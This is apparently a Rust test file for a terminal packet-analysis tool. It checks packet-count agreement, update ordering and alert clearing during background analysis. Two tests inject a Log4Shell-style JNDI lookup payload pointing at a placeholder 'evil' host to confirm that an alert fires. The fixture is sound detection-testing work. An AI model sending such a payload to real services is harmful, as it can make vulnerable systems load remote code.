#![cfg(feature = "terminal-ui")]
#[path = "support/packets.rs"]
mod packets;
use packrat_tui::{analysis::alert_center::AutomationMode, app::App};
use std::time::{Duration, Instant};

fn drain(app: &mut App) {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        app.poll_analysis();
        if app.analysis_idle() {
            break;
        }
        assert!(
            Instant::now() < deadline,
            "Analysis did not drain: {:?}",
            app.status_msg
        );
        std::thread::yield_now();
    }
}

#[test]
fn asynchronous_packets_keep_display_and_analysis_counts_in_agreement() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    for number in 1..=1000 {
        app.inject_packet(packets::tcp(number, 100, 0x18, b"payload"));
    }
    drain(&mut app);
    assert_eq!(app.packets.len(), 1000);
    assert_eq!(
        app.query_core(|core| core
            .flow_tracker
            .flows
            .values()
            .map(|flow| flow.packets)
            .sum::<u64>()),
        Some(1000)
    );
}

#[test]
fn queued_core_updates_preserve_input_order() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    app.configure_core(|core| core.alert_center.automation_mode = AutomationMode::Watch);
    app.inject_packet(packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"));
    drain(&mut app);
    assert!(app.alert_overlay_open);
    assert!(!app.worklist.items.is_empty());
    assert_eq!(
        app.query_core(|core| core.alert_center.automation_mode),
        Some(AutomationMode::Watch)
    );
    assert!(
        app.traffic_latch
            .actions
            .iter()
            .all(|action| action.status
                == packrat_tui::analysis::traffic_latch::LatchStatus::Observed)
    );
}

#[test]
fn clear_discards_old_generation_outcomes_without_reopening_an_alert() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    app.inject_packet(packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"));
    app.poll_analysis();
    loop {
        if app.try_clear_packets().is_ok() {
            break;
        }
        app.poll_analysis();
    }
    drain(&mut app);
    assert!(!app.alert_overlay_open);
    assert!(app.packets.is_empty());
    assert_eq!(
        app.query_core(|core| core.incidents.incidents.len()),
        Some(0)
    );
}
